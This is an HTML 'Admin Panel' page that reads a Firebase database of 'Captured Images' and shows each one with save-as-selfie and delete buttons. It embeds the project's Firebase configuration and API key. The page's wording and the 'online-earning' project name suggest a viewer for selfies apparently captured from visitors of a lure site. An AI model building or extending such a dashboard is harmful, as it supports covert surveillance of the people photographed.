<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body{
  background:#0f0f0f;
  color:#fff;
  font-family:Arial, sans-serif;
  margin:0;
  padding:20px;
}
#loader{
  position:fixed;
  top:0; left:0;
  width:100%; height:100%;
  background:#000;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:20px;
  color:#0f0;
  z-index:999;
}
#noImage{
  text-align:center;
  margin-top:50px;
  color:#aaa;
  display:none;
}
.card{
  display:inline-block;
  background:#1a1a1a;
  margin:10px;
  padding:10px;
  border-radius:10px;
  border:1px solid #0f0;
}
.card img{
  width:220px;
  border-radius:8px;
  display:block;
}
.time{
  font-size:12px;
  color:#ccc;
  margin:6px 0;
}
button{
  padding:6px 10px;
  margin-right:5px;
  border:none;
  border-radius:5px;
  cursor:pointer;
  font-size:13px;
}
.save{ background:#0f0; color:#000;}
.delete{ background:#f00; color:#fff;}
</style>
</head>
<body>

<div id="loader">Loading images...</div>
<h2>ðŸ“¸ Captured Images</h2>
<div id="images"></div>
<div id="noImage">No images found</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-database.js";

// ðŸ”¹ Firebase Configuration (online-earning-9751b)
const firebaseConfig = {
  apiKey: "AIzaSyB0eLmZSDtmF1deFGBNSU9e3aq8_i_DjC4",
  authDomain: "online-earning-9751b.firebaseapp.com",
  databaseURL: "https://online-earning-9751b-default-rtdb.firebaseio.com",
  projectId: "online-earning-9751b",
  storageBucket: "online-earning-9751b.firebasestorage.app",
  messagingSenderId: "454796166249",
  appId: "1:454796166249:web:0606b052e435312a068ef8"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const imagesDiv = document.getElementById("images");
const loader = document.getElementById("loader");
const noImage = document.getElementById("noImage");

// Listen to database in real-time
const imagesRef = ref(db, "tempImages");
onValue(imagesRef, snapshot => {
  imagesDiv.innerHTML = ""; // Clear current
  loader.style.display = "none";

  if (!snapshot.exists()) {
    noImage.style.display = "block";
    return;
  }

  noImage.style.display = "none";

  snapshot.forEach(child => {
    const data = child.val();
    const key = child.key;

    const card = document.createElement("div");
    card.className = "card";

    const img = document.createElement("img");
    img.src = data.image;

    const time = document.createElement("div");
    time.className = "time";
    time.innerText = "Captured: " + new Date(data.time).toLocaleString();

    const saveBtn = document.createElement("button");
    saveBtn.className = "save";
    saveBtn.innerText = "Save";
    saveBtn.onclick = () => {
      const a = document.createElement("a");
      a.href = data.image;
      a.download = "selfie_" + data.time + ".png";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    };

    const deleteBtn = document.createElement("button");
    deleteBtn.className = "delete";
    deleteBtn.innerText = "Delete";
    deleteBtn.onclick = async () => {
      await remove(ref(db, "tempImages/" + key));
      card.remove();
      if (!imagesDiv.hasChildNodes()) noImage.style.display = "block";
    };

    card.append(img, time, saveBtn, deleteBtn);
    imagesDiv.appendChild(card);
  });
});
</script>

</body>
</html>
